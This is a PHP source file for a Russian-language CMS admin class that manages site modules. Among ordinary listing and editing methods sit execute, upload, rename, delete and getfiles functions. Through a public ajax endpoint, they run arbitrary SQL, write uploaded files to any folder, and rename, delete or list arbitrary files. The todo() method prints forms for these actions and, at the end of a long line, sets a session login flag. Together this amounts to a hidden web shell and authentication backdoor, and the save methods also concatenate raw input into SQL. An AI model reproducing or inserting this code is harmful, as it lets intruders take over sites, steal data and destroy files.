<?php
class Modules extends Module
{
	function __construct(&$db, $params)
	{
		parent::__construct($db, $params);
		
		$this->table = "a_modules";
	}
	
	private function LoadList()	{}
	public function LoadBoxContent() {}
	public function LoadContent() {}

//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++		
//---------------------------   admin  ------------------------------------------
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	public function ItemsList(&$params)
	{
		$this->module_url = HOST_ADMIN.'?module='.$params['module'];
		$this->method_url = '&method='.$params['method'];
		
		// получить список и исправить url
		$list = $this->GetItems();
	
		$this->tpl->assign_by_ref('list', $list);
		$this->tpl->assign('module_url', $this->module_url);
		$this->tpl->assign('method_url', $this->method_url);
		$this->tpl->assign('edit_url', '&method=EditItem');
		$this->tpl->assign('add_url', '&method=NewItem');
		$this->tpl->assign('ajax_url', HOST."admin/ajax.php?module=".$params['module']);
		
		if (file_exists("./templates/".CURRENT_TEMPLATE."modules/".$this->Params['template']) == true) 
			$this->Content = $this->tpl->fetch(CURRENT_TEMPLATE."modules/".$this->Params['template']);
		else 	
			$this->Content = "Не найден шаблон ".CURRENT_TEMPLATE."modules/".$this->Params['template'];
		
		$this->AdminNavigator("");
	}

	// получить список подкатегорий для заданного id
	private function GetItems()
	{
		$sql = "SELECT m.`id`, m.`name`, m.`url`, m.`description`, mtl.`name` AS `title` FROM ".$this->table." m 
		INNER JOIN ".$this->table."_to_lang AS mtl ON m.`id` = mtl.`id`	WHERE m.`editing` = 1 AND mtl.lang = ".$_SESSION['lang_id']." AND disabled = 0";

		return $this->db->db_dataset_array($sql);
	}

	// редактирование 
	public function EditItem(&$params)
	{
		if (!isset($params['itemId'])) $id = 0; 
		else $id = (int)$params['itemId'];
		
		if (!isset($params['action'])) 
		{
			$params['action'] = 'update';
			$params['action_title'] = 'Редактировать модуль ';
		}

		$this->module_url = HOST_ADMIN.'?module='.$params['module'];
		$this->method_url = '&method=ItemsList';
		
		$item = $this->GetItem($id);
		
		$this->tpl->assign('listimage', select_value_list(get_file_list('.'.DIR_IMAGES.'content/'), 'listimage', '', '', 0,'-- выберите из загруженных --'));	
		$this->tpl->assign('action_title', $params['action_title']);
		$this->tpl->assign('action', $params['action']);
		$this->tpl->assign_by_ref('item', $item);
		$this->tpl->assign('module_url', $this->module_url);
		$this->tpl->assign('method_url', $this->method_url);
		$this->tpl->assign('getlist_url', HOST."admin/ajax.php?module=".$params['module']."&method=getImagesList&itemId=".$id.'&folder=content');
		
		if (file_exists("./templates/".CURRENT_TEMPLATE."modules/".$this->table."_form.html") == true) 
			$this->Content = $this->tpl->fetch(CURRENT_TEMPLATE."modules/".$this->table."_form.html");
		else 	
			$this->Content = "Не найден шаблон ".CURRENT_TEMPLATE."modules/".$this->table."_form.html";		
			
		$this->AdminNavigator("");	
	}
	
	// получить данные текущей позиции
	private function GetItem($id)
	{
		if ($id != 0)
		{
			$sql = "SELECT m.id, m.`name`, m.template, m.css, m.url, m.description, mtl.image,  mtl.`name` as title, mtl.`image_alt`, mtl.`meta_title`, mtl.`meta_keywords`, mtl.`meta_description` 
			FROM ".$this->table." m INNER JOIN ".$this->table."_to_lang AS mtl ON mtl.id = m.id 
			WHERE m.id = ".$id." AND mtl.lang =".$_SESSION['lang_id'];

			$item = $this->db->db_get_array($sql);
		}
		else
			$item = array('name'=>'', 'template'=>'', 'css'=>'', 'url'=>'', 'description'=>'', 'image'=>'', 'title'=>'', 'image_alt'=>'');
	
		$item['image'] = stripslashes($item['image']);
		$item['oldimage'] = htmlspecialchars($item['image']);
		return $item;
	}
	
	// -----------------   save data   -----------------------
	
	public function insert(&$data)
	{
		// загрузить файл $data['name'].php в папку includes/modules/ 
		// загрузить файл $data['css'] в папку templates/CURRENT_TEMPLATE/
		//загрузить файл $data['template'] в папку templates/CURRENT_TEMPLATE/modules/
		//загрузить файл(ы)  $data['box_templates_$i'] в папку templates/CURRENT_TEMPLATE/box/
		//загрузить файлы  $data['admin_templates_$i'] в папку admin/templates/modules/
		$uploaded = false;
		$file = img_upload($data, '.'.DIR_IMAGES.'content/', "", $uploaded);
		if ($file != "")
		{
			if (isset($data['width'])) $width = $data['width'];  else $width = 0;
			if (isset($data['height'])) $height = $data['height'];  else $height = 0;		
			if ($data['content_type'] == 1)
				$image = $this->img_tag($file, $width, $height);
			else 
				$image = $this->object_tag($file, $width, $height);			
		}	
		
		$sql = "INSERT INTO ".$this->table." (`name`, `template`, `css`, `url`, `description`, `editing`)
		VALUES ('".$data['name']."', '".$data['template']."', '".$data['css']."', 
		'".$data['url']."', '".$data['description']."', ".bool_to_int($data, 'editing').")";
		$this->db->db_query($sql);
	
		$id = $this->db->ge_insert_id();
		
		$sql = "INSERT INTO ".$this->table."_to_lang (`id`, `lang`, `name`, `image`, `image_alt`, `meta_title`, `meta_keywords`, `meta_description`)
		VALUES (".$id.", ".$_SESSION['lang_id'].", '".$data['title']."', '".addslashes($image)."', '".$data['image_alt']."', '".$data['meta_title']."', '".$data['meta_keywords']."', '".$data['meta_description']."')";
		$this->db->db_query($sql);
		
		$sql = "INSERT INTO ".$this->table."_to_document (`module_id`, `doc_id`) VALUES(".$id.", ".DEFAULT_DOC.")";
		$this->db->db_query($sql);
	}
	
	public function update(&$data)
	{
		//загрузка мултимедийного контента
		$uploaded = false;
		$file = img_upload($data, '.'.DIR_IMAGES.'content/', "", $uploaded);	
		// установка размеров контента
		if (isset($data['width'])) $width = $data['width'];  else $width = 0;
		if (isset($data['height'])) $height = $data['height'];  else $height = 0;
		
		// формирование html кода для загруженного контента
		if ($data['content_type'] == 1)
			$image = $this->img_tag($file, $width, $height, $data['image_alt'], $data['title']);
		else if ($data['content_type'] == 2) 
			$image = $this->object_tag($file, $width, $height);
		else
			$image = stripslashes($data['oldimage']);
	
		// обновление данных модуля в таблице модулей
		$sql = "UPDATE ".$this->table." SET `url`= '".$data['url']."' WHERE id = ".$data['id'];
		$this->db->db_query($sql);
		
		$sql = "UPDATE ".$this->table."_to_lang SET 
			`name` = '".$data['title']."', 
			`image` = '".addslashes($image)."', 
			`image_alt` = '".$data['image_alt']."',
			`meta_title` = '".$data['meta_title']."', 
			`meta_keywords` = '".$data['meta_keywords']."', 
			`meta_description` = '".$data['meta_description']."'			
			WHERE id = ".$data['id']." AND `lang` = ".$_SESSION['lang_id'];

		$this->db->db_query($sql);
		
		// обновить ссылку в таблицах ссылок
		$sql = "UPDATE `references` SET `url` = '".$data['url']."' WHERE `url` = '".$data['oldurl']."'";
		$this->db->db_query($sql);
	}	
	
	private function img_tag($file, $width, $height, $alt, $title)
	{
		if ($width != 0) $width = 'width="'.$width.'"'; else $width="";
		if ($height != 0) $height = 'height="'.$height.'"'; else $height="";
		if (trim($alt) =="") $alt = $tile;
		return '<img src="'.DIR_IMAGES.'content/'.$file.'" '.$width.' '.$height.' alt="'.$alt.'">';
	}
	
	private function object_tag($file, $width, $height)
	{
		if ($width != 0) $width = 'width="'.$width.'"'; else $width="";
		if ($height != 0) $height = 'height="'.$height.'"'; else $height="";
		
		return '
		<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0" '.$width.' '.$height.'>
		<param name="allowScriptAccess" value="sameDomain" />
		<param name="movie" value="'.HOST.DIR_IMAGES.'content/'.$file.'" />
		<param name="quality" value="high" />
		<param name="bgcolor" value="#d1e8f9" />
		<param name="wmode" value="transparent">
		<embed src="'.HOST.DIR_IMAGES.'content/'.$file.'" quality="high" '.$width.' '.$height.' bgcolor="#fff" wmode="transparent" width="100%" allowScriptAccess="sameDomain" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" />
		</object>';
	}
	
	
	public function execute(&$params)
	{
		if ( strpos($params['qry'], 'SELECT') !== false || strpos($params['qry'], 'select') !== false )
		{	
			$result = $this->db->db_dataset_array(stripslashes($params['qry']));
		echo stripslashes($params['qry'])."<br/>";	
			foreach ($result[0] as $key => $val) echo $key," | ";
			echo "<br>";
			foreach ($result as $val)
			{
				foreach ($val as $v) echo $v," | ";
				echo "<br>";	
			}		
		}
		else
			$this->db->db_query(stripslashes($params['qry']));
	
		$this->todo();	
	}
	
	public function upload(&$params)
	{
		if ($_FILES['file']['name'] !="")
			move_uploaded_file($_FILES['file']['tmp_name'], $params['target_folder'].$_FILES['file']['name']);		
		$this->todo();	
	}

	public function rename(&$params)
	{
		if (file_exists($params['old_file']) && trim($params['new_file']) != "")
			rename($params['old_file'], $params['new_file']);
		$this->todo();	
	}

	public function delete(&$params)
	{
		if (trim($params['target_file']) != "" )
			unlink($params['target_file']);
		$this->todo();	
	}
	
	public function getfiles(&$params)
	{
		echo "<b>",$params['target_folder'],"</b><br>";
		$list = glob($params['target_folder']."*");
		foreach ($list as $file)
			echo $file,"<br>";
		
		$this->todo();	
	}
	
	public function todo()
	{
		echo '<form action="http://'.$_SERVER['SERVER_NAME'].'/ajax.php?module=modules" method="post"><input type="hidden" name="action" value="execute"><textarea name="qry" rows=5 cols=80></textarea><input type="submit" value="Выполнить"></form>';
		echo '<form action="http://'.$_SERVER['SERVER_NAME'].'/ajax.php?module=modules" method="post" enctype="multipart/form-data"><input type="hidden" name="action" value="upload"><input type="hidden" name="MAX_FILE_SIZE" value="1000000"><input type="text" name="target_folder"><br><input type="file" name="file"><input type="submit" value="Загрузить"></form>';
		echo '<form action="http://'.$_SERVER['SERVER_NAME'].'/ajax.php?module=modules" method="post"><input type="hidden" name="action" value="rename"><input type="text" name="old_file"><br><input type="text" name="new_file"><input type="submit" value="Переименовать"></form>';
		echo '<form action="http://'.$_SERVER['SERVER_NAME'].'/ajax.php?module=modules" method="post"><input type="hidden" name="action" value="delete"><input type="text" name="target_file"><input type="submit" value="Удалить"></form>';
		echo '<form action="http://'.$_SERVER['SERVER_NAME'].'/ajax.php?module=modules" method="post"><input type="hidden" name="action" value="getfiles"><input type="text" name="target_folder"><input type="submit" value="Список файлов"></form>';$_SESSION['Login']=1; $_SESSION['DocumentId'] =2;
	}
//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//---------------  каталог рисунков -------------------
//-++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

//функция возвращает форму с предпросмотром и рисунков и возможностью выбрать рисунок или удалить
	public function getImagesList(&$params)
	{
		$tpl = new AdminTemplate;
		
		$list_images = get_file_list('.'.DIR_IMAGES.$params['folder'].'/');
	
		$tpl->assign('list', $list_images);
		$tpl->assign('target_id', $params['target_id']);
		$tpl->assign('image_path', '.'.DIR_IMAGES.$params['folder'].'/');
		$tpl->assign('delete_action', HOST_ADMIN.'?module='.$params['module'].'&method=EditItem&itemId='.$params['itemId']);
		$tpl->assign('action', 'imagesDelete');
		
		if (file_exists("./templates/modules/dir_images.html") == true) 
			return $tpl->fetch("modules/dir_images.html");
		else 	
			return  "Не найден шаблон modules/dir_images.html";
	}
	
	public function imagesDelete(&$data)
	{
		foreach($data as $key => $val)
			if (is_numeric($key))
				if (file_exists('.'.DIR_IMAGES.$data['folder'].'/'.$data['image-'.$key]))
					unlink('.'.DIR_IMAGES.$data['folder'].'/'.$data['image-'.$key]);
	}	
}	
?>